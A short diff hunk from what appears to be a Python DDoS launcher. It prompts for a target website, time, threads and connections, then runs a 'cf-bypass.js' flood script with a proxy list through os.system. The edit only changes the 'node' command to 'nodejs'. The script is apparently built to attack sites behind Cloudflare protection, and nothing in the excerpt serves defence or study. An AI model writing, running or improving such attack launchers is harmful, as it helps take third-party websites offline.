@@ -152,7 +152,7 @@ while True:
         time = input("\033[31m>>> \033[39mTime \033[31m:\033[36m\033[31m")
         threads = input("\033[31m>>> \033[39mThreads \033[31m:\033[36m\033[31m")
         connections = input("\033[31m>>> \033[39mConnection \033[31m:\033[36m\033[31m")
-        cfbypassrunattack = ("node cf-bypass.js " + cfbypasswebsite + " " + time + " " + threads + " " + "proxies.txt" + " " + connections)
+        cfbypassrunattack = ("nodejs cf-bypass.js " + cfbypasswebsite + " " + time + " " + threads + " " + "proxies.txt" + " " + connections)
         os.system(cfbypassrunattack)
     if kies == "http-vip":
         os.system('clear')
